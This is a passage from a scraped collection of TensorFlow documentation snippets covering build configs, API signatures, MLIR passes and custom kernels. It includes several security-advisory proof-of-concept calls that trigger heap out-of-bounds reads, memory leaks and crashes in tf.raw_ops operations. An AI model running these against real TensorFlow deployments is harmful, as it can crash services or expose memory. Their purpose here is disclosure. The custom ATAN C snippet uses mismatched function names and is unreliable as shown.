DESCRIPTION: This Python snippet provides a minimal example demonstrating how to trigger the heap out-of-bounds access vulnerability in `tf.raw_ops.Dequantize`. It calls the operation with an extremely large value for the `axis` parameter (`2**31-1`), which is not properly validated in the vulnerable versions, leading to the security issue. The function is wrapped in `@tf.function`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-003.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.Dequantize(
    input=tf.constant([1,1],dtype=tf.qint32),
    min_range=[1.0],
    max_range=[10.0],
    mode='MIN_COMBINED',
    narrow_range=False,
    axis=2**31-1,
    dtype=tf.bfloat16)
  return y

test()
```

----------------------------------------

TITLE: Getting Root Object from Buffer Python
DESCRIPTION: This class method is used to deserialize a flatbuffer object from a given buffer. It takes the buffer containing the serialized data and an optional offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Representing Standard Python Function Call
DESCRIPTION: Illustrates a standard Python function call syntax using positional and keyword arguments. This snippet represents the original code structure before AutoGraph processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/functions.md#_snippet_0

LANGUAGE: python
CODE:
```
f(x, y, z=1)
```

----------------------------------------

TITLE: Reordering TFLite Output Details in TensorFlow Lite
DESCRIPTION: Adjusts the order of output tensors in the TFLite interpreter details to align with the expected order of outputs from the original Keras model. This ensures correct interpretation of inference results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_11

LANGUAGE: python
CODE:
```
reorder_output_details(
    tflite_output_details
)

```

----------------------------------------

TITLE: Enabling CUDA Forward Compatibility (Bazel config)
DESCRIPTION: Shows how to add the flag `--@cuda_driver//:enable_forward_compatibility=true` to the `:cuda` configuration in `.bazelrc`. Enabling this flag allows Bazel targets to use the hermetic User Mode Driver while relying on the system's installed Kernel Mode Driver, which can be useful for utilizing newer CUDA Toolkit features with older drivers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_4

LANGUAGE: Bazel config
CODE:
```
test:cuda --@cuda_driver//:enable_forward_compatibility=true
```

----------------------------------------

TITLE: Implementing TensorFlow C++ Gradient Function
DESCRIPTION: Provides the standard function signature and registration macro for implementing a C++ gradient for a TensorFlow operation. The function receives the scope, original operation, gradient inputs, and a pointer to output the calculated gradients. The `REGISTER_GRADIENT_OP` macro links the implementation to the operation name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/cc/gradients/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
Status OpNameGrad(const Scope& scope, const Operation& op,
                      const std::vector<Output>& grad_inputs,
                      std::vector<Output>* grad_outputs) {
      ...
      return scope.status();
    }
    REGISTER_GRADIENT_OP("OpName", OpNameGrad);
```

----------------------------------------

TITLE: Setting Include Directories (StablehloExtensionOps) - CMake
DESCRIPTION: This CMake command configures the include directories for the `StablehloExtensionOps` target. It adds build-interface include paths dynamically determined from the `STABLEHLO_SOURCE_DIR` and `STABLEHLO_BINARY_DIR` variables, making header files available during compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/IR/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
target_include_directories(StablehloExtensionOps INTERFACE
  $<BUILD_INTERFACE:${STABLEHLO_SOURCE_DIR}>
  $<BUILD_INTERFACE:${STABLEHLO_BINARY_DIR}>
)
```

----------------------------------------

TITLE: Return Statement If Without Else Input Example Python
DESCRIPTION: Original Python code showing an `if` statement with a `return` but no `else` branch, used to demonstrate AutoGraph's code normalization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_37

LANGUAGE: Python
CODE:
```
def f():
  if i > 3:
    return 1
  i += 1
```

----------------------------------------

TITLE: Building MLIR MhloPasses Library (CMake)
DESCRIPTION: Defines a CMake target for the MhloPasses library. This library contains various MLIR passes for optimizing and transforming MHLO dialect operations, listing required source files and dependencies on other MLIR components and dialects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
add_mlir_library(MhloPasses
  collapse_elementwise_map/collapse_elementwise_map.cc
  convert_to_signless/convert_to_signless_pass.cc
  expand_hlo_tuples/expand_hlo_tuples.cc
  legalize_dot_to_dot_general/legalize_dot_to_dot_general.cc
  legalize_einsum_to_dot_general/legalize_einsum_to_dot_general.cc
  legalize_torch_index_select_to_gather/legalize_torch_index_select_to_gather.cc
  legalize_trigonometric_to_approximation/legalize_trigonometric_to_approximation.cc
  materialize_broadcasts/materialize_broadcasts.cc
  materialize_broadcasts/materialize_broadcasts_pass.cc
  mhlo_flatten_tuple/mhlo_flatten_tuple.cc
  prepare_for_export/prepare_for_export.cc
  optimize_mhlo/optimize_mhlo.cc
  sink_constants_to_control_flow/sink_constants_to_control_flow.cc
  test_infer_shaped_type/test_infer_shaped_type_pass.cc
  unfuse_batch_norm/unfuse_batch_norm.cc
  unfuse_batch_norm/unfuse_batch_norm_pass.cc

  DEPENDS
  MLIRhlo_opsIncGen
  MLIRMhloPassIncGen

  LINK_COMPONENTS
  Core

  LINK_LIBS PUBLIC
  ChloOps
  MhloAnalysis
  MhloDialect
  MhloScatterUtils
  MhloTypeConversion
  MLIRIR
  MLIRLinalgDialect
  MLIRMathDialect
  MLIRMhloUtils
  MLIRPass
  MLIRSCFDialect
  MLIRSideEffectInterfaces
  MLIRTransformUtils
  StablehloBroadcastUtils
)
```

----------------------------------------

TITLE: Accessing Output Tensor Groups in Python
DESCRIPTION: Accesses a specific entry in the list of output tensor groups. This method allows retrieval of output tensor group definitions by their index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_23

LANGUAGE: python
CODE:
```
OutputTensorGroups(
    j
)
```

----------------------------------------

TITLE: Run hlo-opt for Compilation with Bazel
DESCRIPTION: This command executes the `hlo-opt` tool using Bazel, primarily for compiling HLO modules. It requires specifying a target platform and accepts additional compilation flags and an input filename.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools.md#_snippet_6

LANGUAGE: Bazel
CODE:
```
bazel run //xla/tools:hlo-opt -- --platform=[gpu|cpu|...] [more flags] <filename>
```

----------------------------------------

TITLE: Adding Tensor Names to TensorGroup (Python)
DESCRIPTION: This function is designed to add a list of tensor names (`tensorNames`) to a `TensorGroup` object as part of the TensorFlow Lite metadata generation process. It requires a FlatBuffer `builder` instance which is currently being used to construct the metadata schema. This function facilitates linking specific tensors to a defined group within the metadata structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupAddTensorNames.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorGroupAddTensorNames(
    builder, tensorNames
)
```

----------------------------------------

TITLE: Demonstrating DataFormatVecPermute Vulnerability TensorFlow Python
DESCRIPTION: This snippet demonstrates the vulnerability in `tf.raw_ops.DataFormatVecPermute` by passing invalid or unexpected values for `src_format` and `dst_format`. These invalid formats, which are not checked by the operation, result in unexpected tensor outputs containing arbitrary memory values and ultimately lead to crashes like `munmap_chunk()` or `Aborted` when used with malformed or overly long format strings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-030.md#_snippet_0

LANGUAGE: python
CODE:
```
>>> import tensorflow as tf
>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='1234', dst_format='1234')
<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 757100143], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='HHHH', dst_format='WWWW')
<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='H', dst_format='W')
<tf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)>
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], 
                                    src_format='1234', dst_format='1253')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 2, 939037184, 3], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],
                                    src_format='1234', dst_format='1223')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 32701, 2, 3], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],
                                    src_format='1224', dst_format='1423')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([1, 4, 3, 32701], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format='1234', dst_format='432')
<tf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 3, 2, 32701], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format='12345678', dst_format='87654321')
munmap_chunk(): invalid pointer
Aborted
...
>>> tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],           
                                    src_format='12345678', dst_format='87654321')
<tf.Tensor: shape=(4, 2), dtype=int32, numpy=
array([[71364624,        0],
       [71365824,        0],
       [     560,        0],
       [      48,        0]], dtype=int32)>
...
>>> tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]], 
                                    src_format='12345678', dst_format='87654321')
free(): invalid next size (fast)
Aborted
```

----------------------------------------

TITLE: Triggering Heap Out of Bounds in QuantizedBatchNormWithGlobalNormalization Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the heap out of bounds vulnerability in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`. It creates various input tensors, including empty tensors for the `t_min`, `t_max`, `m_min`, `m_max`, `v_min`, `v_max`, `beta_min`, `beta_max`, `gamma_min`, and `gamma_max` parameters, which the vulnerable C++ kernel fails to handle correctly, resulting in a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-035.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

t = tf.constant([1], shape=[1, 1, 1, 1], dtype=tf.quint8)
t_min = tf.constant([], shape=[0], dtype=tf.float32)
t_max = tf.constant([], shape=[0], dtype=tf.float32)
m = tf.constant([1], shape=[1], dtype=tf.quint8)
m_min = tf.constant([], shape=[0], dtype=tf.float32)
m_max = tf.constant([], shape=[0], dtype=tf.float32)
v = tf.constant([1], shape=[1], dtype=tf.quint8)
v_min = tf.constant([], shape=[0], dtype=tf.float32)
v_max = tf.constant([], shape=[0], dtype=tf.float32)
beta = tf.constant([1], shape=[1], dtype=tf.quint8)
beta_min = tf.constant([], shape=[0], dtype=tf.float32)
beta_max = tf.constant([], shape=[0], dtype=tf.float32)
gamma = tf.constant([1], shape=[1], dtype=tf.quint8)
gamma_min = tf.constant([], shape=[0], dtype=tf.float32)
gamma_max = tf.constant([], shape=[0], dtype=tf.float32)

tf.raw_ops.QuantizedBatchNormWithGlobalNormalization(
  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,
  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,
  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,
  gamma_max=gamma_max, out_type=tf.qint32,
  variance_epsilon=0.1, scale_after_normalization=True)
```

----------------------------------------

TITLE: Calling AudioPropertiesStart in Python
DESCRIPTION: This snippet shows the basic syntax for calling the `AudioPropertiesStart` function. It requires a FlatBuffers `builder` object as the sole argument. This function is the first step in building an `AudioProperties` table in the FlatBuffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesStart.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.AudioPropertiesStart(
    builder
)
```

----------------------------------------

TITLE: Defining JAX Plugin Entry Point pyproject.toml
DESCRIPTION: Example demonstrating how to define a JAX plugin entry point within a `pyproject.toml` file. This is one method for making your plugin module discoverable by the JAX framework using package metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_4

LANGUAGE: toml
CODE:
```
# use pyproject.toml
[project.entry-points.'jax_plugins']
my_plugin = 'my_plugin'
```

----------------------------------------

TITLE: Generating HLO Ops Code using TableGen (Part 1)
DESCRIPTION: These commands configure and invoke `mlir_tablegen` to process the `hlo_ops.td` TableGen file, generating various C++ source and header files (`.inc`) containing declarations and definitions for HLO operations, enums, and attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/IR/CMakeLists.txt#_snippet_0

LANGUAGE: cmake
CODE:
```
set(LLVM_TARGET_DEFINITIONS hlo_ops.td)
mlir_tablegen(hlo_ops.h.inc -gen-op-decls)
mlir_tablegen(hlo_ops.cc.inc -gen-op-defs)
mlir_tablegen(hlo_ops_enums.h.inc -gen-enum-decls)
mlir_tablegen(hlo_ops_enums.cc.inc -gen-enum-defs)
mlir_tablegen(hlo_ops_attrs.h.inc -gen-attrdef-decls)
mlir_tablegen(hlo_ops_attrs.cc.inc -gen-attrdef-defs)
mlir_tablegen(hlo_ops_typedefs.h.inc -gen-typedef-decls --typedefs-dialect=mhlo)
mlir_tablegen(hlo_ops_typedefs.cc.inc -gen-typedef-defs --typedefs-dialect=mhlo)
```

----------------------------------------

TITLE: Packing BoundingBoxPropertiesT into Builder - Python
DESCRIPTION: Documents the instance method `Pack`, which serializes the current `BoundingBoxPropertiesT` object's data into a flatbuffer builder. It takes a flatbuffer `builder` object as input, adding the object's representation to the buffer construction process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Adding Public Tablegen Target for CHLO Legalization (CMake)
DESCRIPTION: Defines a public CMake target named MLIRChloLegalizeToHloIncGen for the generated CHLO legalization includes. This target ensures that the tablegen output is generated before dependent libraries are compiled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/mhlo/transforms/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
add_public_tablegen_target(MLIRChloLegalizeToHloIncGen)
```

----------------------------------------

TITLE: Original TPU Training Loop MLIR Structure
DESCRIPTION: This MLIR snippet shows a standard TensorFlow training loop structure before optimization. It includes a `tf.while` loop iterating over variables and a nested `tf_device.replicate` block that contains the TPU compilation and execution operations (`tf._TPUCompileMlir`, `tf.TPUExecuteAndUpdateVariablesOp`) operating on replicated variables. This illustrates the basic loop pattern that the `-tf-tpu-variable-runtime-reformatting` pass targets for modification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_73

LANGUAGE: MLIR
CODE:
```
  %var0 = ...
  %var1 = ...
  tf.while (..., %var0, %var1) {
    tf_device.replicate ([%var0, %var1] as %rvar) {
      %compile:2 = "tf._TPUCompileMlir"()
      tf.TPUExecuteAndUpdateVariablesOp(%rvar, compile#1)
    }
  }
```

----------------------------------------

TITLE: Packing ImagePropertiesT into Builder in Python
DESCRIPTION: This instance method serializes the current state of the `ImagePropertiesT` object into a provided `builder` object, typically a FlatBuffers `Builder`. It converts the object's properties into the binary format defined by the schema. The resulting packed data can then be finalized and written to a buffer or file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImagePropertiesT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: Demonstrating Undefined Behavior in SparseTensorSliceDataset Python
DESCRIPTION: This Python snippet demonstrates how to trigger an undefined behavior vulnerability (null pointer dereference) in TensorFlow's `tf.raw_ops.SparseTensorSliceDataset` operation. It shows a call with empty `indices` and `values` arrays but a non-empty `dense_shape`, which is not properly validated in vulnerable versions. Required dependencies are `tensorflow` and `numpy`. The expected output in vulnerable versions is undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-016.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

tf.raw_ops.SparseTensorSliceDataset(
  indices=[[]],
  values=[],
  dense_shape=[1,1])
```

----------------------------------------

TITLE: Initializing BertNLClassifier Python Class
DESCRIPTION: Initializes the `BertNLClassifier` object. It requires `options` (of type `BertNLClassifierOptions`) and an internal `cpp_classifier` object. This is the class constructor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertNLClassifier.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.BertNLClassifier(
    options: <a href="../../../tflite_support/task/text/BertNLClassifierOptions"><code>tflite_support.task.text.BertNLClassifierOptions</code></a>,
    cpp_classifier: _CppBertNLClassifier
) -> None
```

----------------------------------------

TITLE: Initializing ScoreCalibrationOptions - TFLite Metadata Python
DESCRIPTION: This method initializes an instance of the `ScoreCalibrationOptions` object using a given buffer (`buf`) and position (`pos`). It prepares the object to access data within the FlatBuffer structure located at that position.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptions.md#_snippet_3

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)

```

----------------------------------------

TITLE: Creating CPU Acceleration Configuration (Java)
DESCRIPTION: Creates a CpuAccelerationConfig object using a builder. This configuration represents a potential CPU acceleration setup for TFLite inference evaluation benchmarks. The setNumThreads parameter specifies the number of CPU threads that should be used during the performance benchmark.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/acceleration_service.md#_snippet_2

LANGUAGE: Java
CODE:
```
AccelerationConfig accelerationConfig = new CpuAccelerationConfig.Builder()
  .setNumThreads(2)
  .build();
```

----------------------------------------

TITLE: Lowering Concatenation (MLIR/TOSA IR)
DESCRIPTION: Lowers a Concatenation operation (similar to ConcatV2) to TOSA. It handles inputs with size zero (reshaping them to scalars) and applies rescaling if the input types differ from the output type. The tensors are then concatenated sequentially using the tosa.CONCAT operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_5

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_concatv2_op(Type output_type, Value %values, int32 axis)
{
    int32 tosa_axis = positive_axis(axis)

    assert(%values.size >= 2)

    // Convert scalar inputs to a tensor
    if (%values:0.size == 0) {
       for (int32 i = 0; i < %values.size; i++) {
          %values:i = tosa.RESHAPE(%values:i) {new_shape=1}
       }
    }

    for (int32 i=0; i < %values.size(); i++) {
        %val = %values:i
        if (%val.zp != output_type.zp || %val.scale != output_type.scale) {
            float64 rescale_scale = %val.scale / output_type.scale
            %values:i = tosa.RESCALE(%val) {scale=rescale_scale, input_zp=%values:0.zp, output_zp=output_type.zp}
        }
    }

    %concat_op = tosa.CONCAT(%values:0, %values:1) {axis=tosa_axis}

    for (int32 i = 2; i < %values.size; i++) {
        %concat_op = tosa.CONCAT(%concat_op, %values:i) {axis=tosa_axis}
    }

    return %concat_op
}
```

----------------------------------------

TITLE: Adding Audio Channels using TFLite Metadata Builder (Python)
DESCRIPTION: This function is used to add the number of audio channels to a FlatBuffers `AudioProperties` table being built. It takes a FlatBuffers builder object and the integer value for the number of channels. This is part of the Python-generated code from the TFLite metadata schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AudioPropertiesAddChannels.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.AudioPropertiesAddChannels(
    builder, channels
)
```

----------------------------------------

TITLE: Add Build Subdirectories
DESCRIPTION: Includes various subdirectories in the build process, organizing the project into functional components like bindings, dialects (mhlo, stablehlo, stablehlo_ext), tests, tools, transforms, and utilities. It also includes the cmake/modules directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/CMakeLists.txt#_snippet_15

LANGUAGE: CMake
CODE:
```
add_subdirectory(bindings)
add_subdirectory(deallocation)
add_subdirectory(mhlo)
add_subdirectory(stablehlo)
add_subdirectory(stablehlo_ext)
add_subdirectory(tests)
add_subdirectory(tools)
add_subdirectory(transforms)
add_subdirectory(utils)


add_subdirectory(cmake/modules)
```

----------------------------------------

TITLE: Clustering TF Ops by Device with tf_device.launch MLIR
DESCRIPTION: Illustrates how operations with the same device assignment (`device = "tpu0"`) are grouped into a `tf_device.launch` operation in TensorFlow MLIR, replacing the original individual ops within the cluster.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_3

LANGUAGE: MLIR
CODE:
```
  %2 = "tf.A"(%arg0) : (tensor<?xi32>) -> tensor<?xi32>
  %3 = "tf.B"(%2) {device = "tpu0"} : (tensor<?xi32>) -> tensor<?xi32>
  %4 = "tf.C"(%2, %3) {device = "tpu0"} : (tensor<?xi32>, tensor<?xi32>) -> tensor<?xi32>
  %5 = "tf.D"(%4) : (tensor<?xi32>) -> tensor<?xi32>

```

LANGUAGE: MLIR
CODE:
```
  %0 = "tf.A"(%arg0) : (tensor<?xi32>) -> tensor<?xi32>
  %1 = "tf_device.launch"() ( {
    %3 = "tf.B"(%0) : (tensor<?xi32>) -> tensor<?xi32>
    %4 = "tf.C"(%0, %3) : (tensor<?xi32>, tensor<?xi32>) -> tensor<?xi32>
    tf_device.return %4 : tensor<?xi32>
  }) {device = "tpu0"} : () -> tensor<?xi32>
  %2 = "tf.D"(%1) : (tensor<?xi32>) -> tensor<?xi32>
  return %2 : tensor<?xi32>

```

----------------------------------------

TITLE: Importing Dependencies and Checking TensorFlow Version (Python)
DESCRIPTION: Imports the core Python libraries needed for the super resolution task: `tensorflow`, `tensorflow_hub`, and `matplotlib.pyplot`. It also prints the installed TensorFlow version to verify the setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/super_resolution/overview.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
import tensorflow_hub as hub
import matplotlib.pyplot as plt
print(tf.__version__)
```

----------------------------------------

TITLE: Implementing Rename Operation Transform Function in TensorFlow C++
DESCRIPTION: This C++ snippet demonstrates the implementation of a custom TensorFlow graph transform function named `RenameOp`. It takes an input GraphDef and a context containing parameters, iterates through each node, copies it to the output GraphDef, and modifies the 'op' name if it matches the 'old_op_name' parameter. It includes validation to ensure the required parameters are provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/graph_transforms/README.md#_snippet_10

LANGUAGE: C++
CODE:
```
Status RenameOp(const GraphDef& input_graph_def,
                const TransformFuncContext& context,
                GraphDef* output_graph_def) {
  if (!context.params.count("old_op_name") ||
      (context.params.at("old_op_name").size() != 1) ||
      !context.params.count("new_op_name") ||
      (context.params.at("new_op_name").size() != 1)) {
    return errors::InvalidArgument(
        "rename_op expects exactly one 'old_op_name' and 'new_op_name' "
        "argument, e.g. rename_op(old_op_name=Mul, new_op_name=Multiply)");
  }

  const string old_op_name = context.params.at("old_op_name")[0];
  const string new_op_name = context.params.at("new_op_name")[0];
  output_graph_def->Clear();
  for (const NodeDef& node : input_graph_def.node()) {
    NodeDef* new_node = output_graph_def->mutable_node()->Add();
    new_node->CopyFrom(node);
    if (node.op() == old_op_name) {
      new_node->set_op(new_op_name);
    }
  }

  return OkStatus();
}

REGISTER_GRAPH_TRANSFORM("rename_op", RenameOp);
```

----------------------------------------

TITLE: Build Object Detection Evaluation Binary - Android ARM64 Bazel
DESCRIPTION: Compiles the `run_eval` object detection evaluation binary specifically for the Android ARM64 architecture using Bazel. Optimizations are enabled (`-c opt`), and the C++ standard is set to c++17.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_1

LANGUAGE: Bazel/Shell
CODE:
```
bazel build -c opt \
  --config=android_arm64 \
  --cxxopt='--std=c++17' \
  //tensorflow/lite/tools/evaluation/tasks/coco_object_detection:run_eval
```

----------------------------------------

TITLE: Build TFLite Label Image Example (CMake)
DESCRIPTION: Builds the TensorFlow Lite label image example executable using the CMake build system. The `-t label_image` option specifically targets this example application, demonstrating basic inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_19

LANGUAGE: sh
CODE:
```
cmake --build . -j -t label_image
```

----------------------------------------

TITLE: Defining FusedFullyConnected Composite Op in Python
DESCRIPTION: Defines a new composite TensorFlow operation named `FusedFullyConnected` using the `@Composite` decorator. This operation represents a fused composition of `MatMul`, `Add`, and an optional activation function (RELU, RELU6, or TANH) based on the `act` attribute. It specifies the input and output tensors along with their types and required attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tfr/README.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@Composite(
    'FusedFullyConnected',
    inputs=['input_: T', 'filter_: T', 'bias: T'],
    attrs=['act: {"", "RELU", "RELU6", "TANH"} = ""'],
    derived_attrs=['T: {float, int8}'],
    outputs=['o: T'])
def _composite_fully_connected(input_, filter_, bias, act):
  res = tf.raw_ops.MatMul(
      a=input_, b=filter_, transpose_a=False, transpose_b=True)
  res = tf.raw_ops.Add(x=res, y=bias)
  if act == 'RELU':
    return tf.raw_ops.Relu(features=res)
  elif act == 'RELU6':
    return tf.raw_ops.Relu6(features=res)
  elif act == 'TANH':
    return tf.raw_ops.Tanh(x=res)
  else:
    return res
```

----------------------------------------

TITLE: Correcting Nested Lambdas with Distinct Args (TF 2.4+) Python
DESCRIPTION: Provides the solution for parsing nested lambda functions in TF 2.4+, demonstrating the use of distinct argument names (`outer_x`, `inner_x`). This allows AutoGraph's parser to correctly identify and convert the nested functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_52

LANGUAGE: Python
CODE:
```
l = lambda outer_x: lambda inner_x: inner_x + 1
```

----------------------------------------

TITLE: Defining ATAN Kernel Functions and Registration C
DESCRIPTION: Defines the core logic for a custom ATAN operator in TensorFlow Lite using C. Includes `AtanPrepare` for tensor sizing, `AtanEval` for performing the arctangent calculation, `AtanOpCreate` to build the `TfLiteOperator` structure, and `AtanOpRegistrationExternal` to provide a singleton instance of the registration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_14

LANGUAGE: C
CODE:
```
static TfLiteStatus AtanPrepare(TfLiteOpaqueContext* context, TfLiteOpaqueNode* node) {
  TF_LITE_OPAQUE_ENSURE_EQ(context, TfLiteOpaqueNodeNumInputs(node), 1);
  TF_LITE_OPAQUE_ENSURE_EQ(context, TfLiteOpaqueNodeNumOutputs(node), 1);

  const TfLiteOpaqueTensor* input = TfLiteOpaqueNodeGetInput(context, node, 0);
  TfLiteOpaqueTensor* output = TfLiteOpaqueNodeGetOutput(context, node, 0);

  int num_dims = TfLiteOpaqueTensorNumDimensions(input);

  TfLiteIntArray* output_size = TfLiteIntArrayCreate(num_dims);
  for (int i = 0; i < num_dims; ++i) {
    output_size->data[i] = input->dims->data[i];
  }

  return TfLiteOpaqueContextResizeTensor(context, output, output_size);
}

static TfLiteStatus AtanEval(TfLiteOpaqueContext* context, TfLiteOpaqueNode* node) {
  const TfLiteOpaqueTensor* input = TfLiteOpaqueNodeGetInput(context, node, 0);
  TfLiteOpaqueTensor* output = TfLiteOpaqueNodeGetOutput(context, node, 0);

  float* input_data = static_cast<float*>(TfLiteOpaqueTensorData(input));
  float* output_data = static_cast<float*>(TfLiteOpaqueTensorData(output));

  size_t count = 1;
  int num_dims = TfLiteOpaqueTensorNumDimensions(input);
  for (int i = 0; i < num_dims; ++i) {
    count *= input->dims->data[i];
  }

  for (size_t i = 0; i < count; ++i) {
    output_data[i] = atan(input_data[i]);
  }
  return kTfLiteOk;
}

static const TfLiteOperator* AtanOpCreate() {
  TfLiteOperator* r = TfLiteOperatorCreate(
          kTfLiteBuiltinCustom, "ATAN", /*version=*/ 1);
  TfLiteOperatorSetPrepare(r, Prepare);
  TfLiteOperatorSetInvoke(r, Eval);
  return r;
}

const TfLiteOperator* AtanOpRegistrationExternal() {
  // Singleton instance, intentionally never destroyed.
  static const TfLiteOperator* atan_op = AtanOpCreate();
  return atan_op;
}
```

----------------------------------------

TITLE: Creating a Basic Python-to-C++ Transpiler
DESCRIPTION: Defines a transpiler `PyToBasicCpp` inheriting from `transpiler.GenericTranspiler`. It implements the `transform_ast` method, which takes a Python AST node and a context, initializes the `BasicCppCodegen` visitor, traverses the AST using the visitor, and returns the generated C++ code buffer. This shows how a transpiler wraps a code generator.
